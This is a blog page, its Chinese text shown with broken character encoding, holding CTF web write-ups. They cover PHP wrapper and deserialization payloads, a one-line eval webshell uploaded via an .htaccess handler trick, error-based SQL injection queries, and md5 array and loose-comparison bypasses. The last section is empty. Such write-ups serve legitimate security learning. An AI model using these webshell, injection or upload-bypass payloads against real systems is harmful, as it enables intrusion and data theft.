<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>æ¯å¤©ä¸€é“ctf - ITå­¦ä¹ è€…åšå®¢</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="æ¯å¤©ä¸€é“ctf" />
<meta property="og:description" content="ä¸€.[ZJCTF 2019]NiZhuanSiWei çœ‹åˆ°æ³¨é‡Šæœ‰Â useless.phpäºæ˜¯è®¿é—®ä¸€ä¸‹
å‘ç°ä»€ä¹ˆéƒ½æ²¡æœ‰
ä»£ç å®¡è®¡ï¼šæœ‰è¿™æ ·ä¸€è¡Œä»£ç isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&#34;welcome to the zjctf&#34;ï¼Œæˆ‘ä»¬éœ€è¦ä¼ å…¥ä¸€ä¸ªå†…å®¹ä¸ºwelcome to the zjctfçš„æ–‡ä»¶ã€‚è¿™æ—¶å°±è¦ç”¨åˆ°dataåè®®
dataåè®®é€šå¸¸æ˜¯ç”¨æ¥æ‰§è¡ŒPHPä»£ç ï¼Œä¹Ÿå¯ä»¥å°†å†…å®¹å†™å…¥dataåè®®ä¸­ï¼Œç„¶åè®©file_get_contentså‡½æ•°å–è¯»å–ã€‚æ„é€ ï¼šdata://text/plain,welcome to the zjctfï¼Œä¸ºäº†ç»•è¿‡æŸäº›è¿‡æ»¤ï¼Œè¿™é‡Œç”¨åˆ°base64ç¼–ç ã€‚æ„é€ payloadï¼štext=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=ã€‚
ç„¶åæœ‰ä¸€ä¸ªå¯æ§å‚æ•°fileï¼Œæ„é€ file=useless.phpï¼Œä½†æ˜¯é’ˆå¯¹phpæ–‡ä»¶æˆ‘ä»¬éœ€è¦è¿›è¡Œbase64ç¼–ç ï¼Œå¦åˆ™è¯»å–ä¸åˆ°å…¶å†…å®¹ï¼Œæ‰€ä»¥æ„é€ payloadï¼šfile=php://filter/read=convert.base64-encode/resource=useless.phpã€‚
å¾—åˆ°ä»¥ä¸‹ç»è¿‡base64åŠ å¯†çš„å­—ç¬¦ï¼Œ
ç„¶åbase64è§£å¯†ï¼Œå¾—åˆ° useless.phpçš„å†…å®¹
&lt;?php â€‹ class Flag{ //flag.php public $file; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo &#34;&lt;br&gt;&#34;; return (&#34;U R SO CLOSE !///COME ON PLZ&#34;); } } } ?&gt; éœ€è¦è°ƒç”¨flagï¼Œåºåˆ—åŒ–å¤„ç†
&lt;?php class Flag{ public $file=&#39;flag.php&#39;; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo &#34;&lt;br&gt;&#34;; return (&#34;U R SO CLOSE !///COME ON PLZ&#34;); } } } $password=new Flag(); $password = serialize($password); echo $password; ?" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/c219b361034ce189b2d85a6f0477f5c5/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-11-13T21:19:21+08:00" />
<meta property="article:modified_time" content="2022-11-13T21:19:21+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="ITå­¦ä¹ è€…åšå®¢" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">ITå­¦ä¹ è€…åšå®¢</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">æ¯å¤©ä¸€é“ctf</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h3>ä¸€.[ZJCTF 2019]NiZhuanSiWei</h3> 
<p><img alt="" height="522" src="https://images2.imgbox.com/f5/9e/VhSniY6j_o.png" width="865"></p> 
<p>çœ‹åˆ°æ³¨é‡Šæœ‰Â <code>useless.phpäºæ˜¯è®¿é—®ä¸€ä¸‹</code></p> 
<p><img alt="" height="195" src="https://images2.imgbox.com/7c/d3/xJKKrW1D_o.png" width="687"></p> 
<p>å‘ç°ä»€ä¹ˆéƒ½æ²¡æœ‰</p> 
<p><strong>ä»£ç å®¡è®¡</strong>ï¼šæœ‰è¿™æ ·ä¸€è¡Œä»£ç isset($text)&amp;&amp;(file_get_contents($text,'r')==="welcome to the zjctf"ï¼Œæˆ‘ä»¬éœ€è¦ä¼ å…¥ä¸€ä¸ªå†…å®¹ä¸ºwelcome to the zjctfçš„æ–‡ä»¶ã€‚è¿™æ—¶å°±è¦ç”¨åˆ°dataåè®®</p> 
<p>dataåè®®é€šå¸¸æ˜¯ç”¨æ¥æ‰§è¡ŒPHPä»£ç ï¼Œä¹Ÿå¯ä»¥å°†å†…å®¹å†™å…¥dataåè®®ä¸­ï¼Œç„¶åè®©file_get_contentså‡½æ•°å–è¯»å–ã€‚æ„é€ ï¼šdata://text/plain,welcome to the zjctfï¼Œä¸ºäº†ç»•è¿‡æŸäº›è¿‡æ»¤ï¼Œè¿™é‡Œç”¨åˆ°base64ç¼–ç ã€‚æ„é€ payloadï¼štext=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=ã€‚</p> 
<p>ç„¶åæœ‰ä¸€ä¸ªå¯æ§å‚æ•°fileï¼Œæ„é€ file=useless.phpï¼Œä½†æ˜¯é’ˆå¯¹phpæ–‡ä»¶æˆ‘ä»¬éœ€è¦è¿›è¡Œbase64ç¼–ç ï¼Œå¦åˆ™è¯»å–ä¸åˆ°å…¶å†…å®¹ï¼Œæ‰€ä»¥æ„é€ payloadï¼šfile=php://filter/read=convert.base64-encode/resource=useless.phpã€‚<br> å¾—åˆ°ä»¥ä¸‹ç»è¿‡base64åŠ å¯†çš„å­—ç¬¦ï¼Œ<br><img alt="" height="203" src="https://images2.imgbox.com/a8/3f/wZwjH18q_o.png" width="1200"></p> 
<p>ç„¶åbase64è§£å¯†ï¼Œå¾—åˆ° useless.phpçš„å†…å®¹</p> 
<pre><code class="hljs">&lt;?php  
â€‹
class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this-&gt;file)){  
            echo file_get_contents($this-&gt;file); 
            echo "&lt;br&gt;";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?&gt;
</code></pre> 
<p>éœ€è¦è°ƒç”¨flagï¼Œåºåˆ—åŒ–å¤„ç†</p> 
<pre><code class="hljs">&lt;?php  
class Flag{
    public $file='flag.php';  
    public function __tostring(){  
        if(isset($this-&gt;file)){  
            echo file_get_contents($this-&gt;file); 
            echo "&lt;br&gt;";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
} 
$password=new Flag();
$password = serialize($password);
echo $password; 
?&gt;  

</code></pre> 
<p>ç»“æœä¸ºï¼šO:4:"Flag":1:{s:4:"file";s:8:"flag.php";}</p> 
<p>æœ€ç»ˆpayloadï¼š</p> 
<pre><code class="hljs">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}</code></pre> 
<p><img alt="" height="348" src="https://images2.imgbox.com/e2/d3/Ha1rAHtR_o.png" width="542"></p> 
<p>æŸ¥çœ‹æºç </p> 
<p>Â <img alt="" height="394" src="https://images2.imgbox.com/dd/b1/ruhBY0Ec_o.png" width="719"></p> 
<h3>Â äºŒ.[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h3> 
<p>å…ˆè¯•ç€ä¸ªä¸€å¥è¯æœ¨é©¬ä¸Šå»<code>&lt;?php @eval($_POST['test']);?&gt;</code></p> 
<p><img alt="" height="149" src="https://images2.imgbox.com/57/f3/BqtDXbY2_o.png" width="404"></p> 
<p>ä¸Šä¼ å¤±è´¥ï¼Œ<br> æ¥ç€åˆè¯•äº†è¯•å›¾ç‰‡é©¬ï¼Œ</p> 
<p><img alt="" height="131" src="https://images2.imgbox.com/fe/e9/7oG7gg6w_o.png" width="312">Â </p> 
<p>å¤±è´¥äº†</p> 
<p>ç„¶å ä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œç”¨æ¥æ”¹å˜æ–‡ä»¶æ‰©å±•å</p> 
<pre><code class="hljs">&lt;FilesMatch "a.png"&gt;
SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;</code></pre> 
<p>&lt;FilesMatch "a.png"&gt;æŒ‡å®šçš„æ˜¯è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼Œæ³¨æ„æ–‡ä»¶åå¿…é¡»ç›¸åŒ</p> 
<p>ä¸Šä¼ æ—¶å…ˆæŠ“åŒ…ï¼Œä¿®æ”¹Content-Type:image/png</p> 
<p><img alt="" height="244" src="https://images2.imgbox.com/47/ec/CUGY3xRC_o.png" width="491"><br> ç‚¹å‡»forwardï¼Œä¸Šä¼ æˆåŠŸ</p> 
<p>ç¬¬äºŒä¸ªï¼šæœ¨é©¬æ–‡ä»¶ï¼Œç”¨æ¥è¿æ¥èšå‰‘æˆ–èœåˆ€</p> 
<p>ä¸Šä¼ æ—¶åŒæ ·ä¿®æ”¹Content-Type:image/png</p> 
<p><img alt="" height="80" src="https://images2.imgbox.com/5d/24/HnkrRhSM_o.png" width="728"><br> ç”¨èšå‰‘è¿æ¥ï¼šhttp://93ac29f7-de06-4936-9f07-9b157b4704d2.node4.buuoj.cn:81/upload/fa59a7192463c0cd3dae65088e762e1f/a.png</p> 
<p>Â <img alt="" height="164" src="https://images2.imgbox.com/2d/fd/D0lYVAqX_o.png" width="476"></p> 
<p>å¾—åˆ°flag</p> 
<p><img alt="" height="128" src="https://images2.imgbox.com/a1/0d/CASEY6j9_o.png" width="654">Â </p> 
<h3>ä¸‰.Â [æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h3> 
<p>sqlæ³¨å…¥çš„é¢˜ç›®</p> 
<p>å…ˆè¯•ä¸‡èƒ½å¯†ç ï¼Œå¾ˆæ˜æ˜¾è¢«banäº†Â  Â  Â æ˜¯æŠ¥é”™æ³¨å…¥</p> 
<p>æŸ¥æ•°æ®åº“çš„ä¿¡æ¯ï¼Œå¾—åˆ°geek</p> 
<pre><code class="hljs">/check.php?username=admin'or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&amp;password=123</code></pre> 
<p><img alt="" height="462" src="https://images2.imgbox.com/bf/da/MdXwcu2e_o.png" width="496"></p> 
<p>Â æŸ¥è¡¨ï¼Œå¾—åˆ°H4rDsq1</p> 
<pre><code class="hljs">/check.php?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&amp;password=123
</code></pre> 
<p><img alt="" height="397" src="https://images2.imgbox.com/3e/61/9RsJ5F6F_o.png" width="675"></p> 
<p>æŸ¥å­—æ®µï¼Œå¾—åˆ°id,username,password</p> 
<pre><code class="hljs">/check.php?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))%23&amp;password=123</code></pre> 
<p><img alt="" height="301" src="https://images2.imgbox.com/6b/31/yapJl4T8_o.png" width="616"></p> 
<p>æŸ¥æ•°æ®ï¼Œé¦–å…ˆå¾—åˆ°äº†ä¸€åŠçš„flag</p> 
<pre><code class="hljs">/check.php?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(username,'~',password))from(H4rDsq1)),0x7e),1))%23&amp;password=123</code></pre> 
<p><img alt="" height="269" src="https://images2.imgbox.com/95/21/G7syChk3_o.png" width="689"></p> 
<p>Â flag{2ec69aaf-c092-47f5-9e</p> 
<p>å†ç”¨left()right()è¯­å¥è¿›è¡ŒæŸ¥è¯¢æ‹¼æ¥</p> 
<pre><code class="hljs">/check.php?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))%23&amp;password=123</code></pre> 
<p><img alt="" height="257" src="https://images2.imgbox.com/69/85/FaFkJlOZ_o.png" width="652"></p> 
<p>2-47f5-9e5e-cf80d3d28e85}</p> 
<p>å¾—åˆ°flag</p> 
<p>flag{2ec69aaf-c092-47f5-9e5e-cf80d3d28e85}</p> 
<h3>å››.[MRCTF2020]Ez_bypass</h3> 
<p><img alt="" height="246" src="https://images2.imgbox.com/d8/97/CtcQ4v0X_o.png" width="873"></p> 
<p>Â F12æŸ¥çœ‹æºç </p> 
<pre><code class="hljs">I put something in F12 for you
include 'flag.php';
$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
if(isset($_GET['gg'])&amp;&amp;isset($_GET['id'])) {
    $id=$_GET['id'];
    $gg=$_GET['gg'];
    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) {
        echo 'You got the first step';
        if(isset($_POST['passwd'])) {
            $passwd=$_POST['passwd'];
            if (!is_numeric($passwd))
            {
                 if($passwd==1234567)
                 {
                     echo 'Good Job!';
                     highlight_file('flag.php');
                     die('By Retr_0');
                 }
                 else
                 {
                     echo "can you think twice??";
                 }
            }
            else{
                echo 'You can not get it !';
            }

        }
        else{
            die('only one way to get the flag');
        }
}
    else {
        echo "You are not a real hacker!";
    }
}
else{
    die('Please input first');
}
}Please input first

</code></pre> 
<p>è¿™é‡Œè¦æ±‚<code>md5($id) === md5($gg) &amp;&amp; $id !== $gg</code></p> 
<blockquote> 
 <p><code>md5($v1)===md5($v2)</code>æ•°ç»„ç»•è¿‡ï¼ša[]=a&amp;b[]=b<br> æœ€åå¯èƒ½ä¼šæŠ¥é”™ï¼Œä½†æ˜¯<code>null=null</code>ï¼Œåˆ¤æ–­ä¸ºtrueï¼ŒæˆåŠŸç»•è¿‡</p> 
</blockquote> 
<p>ä½¿ç”¨æ•°ç»„ç»•è¿‡ï¼š<code>/?id[]=a&amp;gg[]=b</code></p> 
<p><img alt="" height="434" src="https://images2.imgbox.com/37/56/hhDOaY6l_o.png" width="964"></p> 
<p>Â æ¥ç€è¦ä»¥POSTä¼ å‚</p> 
<pre><code class="hljs">if (!is_numeric($passwd))
            {
                 if($passwd==1234567)
                 {
                     echo 'Good Job!';
                     highlight_file('flag.php');
                     die('By Retr_0');
                 }
</code></pre> 
<p>å…¶ä¸­<code>is_numeric()Â </code>å‡½æ•°ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ã€‚è¿™é‡Œè¦æ±‚passwdä¸æ˜¯æ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²æ—¶ï¼Œå¼±ç­‰äºåˆ¤æ–­passwdæ˜¯å¦ç­‰äº1234567<br> æ•…æ„é€ payloadï¼š<code>passwd=1234567a</code></p> 
<p><img alt="" height="566" src="https://images2.imgbox.com/55/91/NAoB8IT0_o.png" width="945"></p> 
<p>Â å¾—åˆ°flag</p> 
<h3>äº”.[SUCTF 2019]CheckIn</h3> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p>Â </p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/ff8b77e55b61d47b40169f701fac9a67/" rel="prev">
			<span class="pager__subtitle">Â«&thinsp;Previous</span>
			<p class="pager__title">replaceçš„ä½¿ç”¨</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/03a4741aff485bc4140376fd5c28551c/" rel="next">
			<span class="pager__subtitle">Next&thinsp;Â»</span>
			<p class="pager__title">sharding-jdbcå®ç°è¯»å†™åˆ†ç¦»</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 ITå­¦ä¹ è€…åšå®¢.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>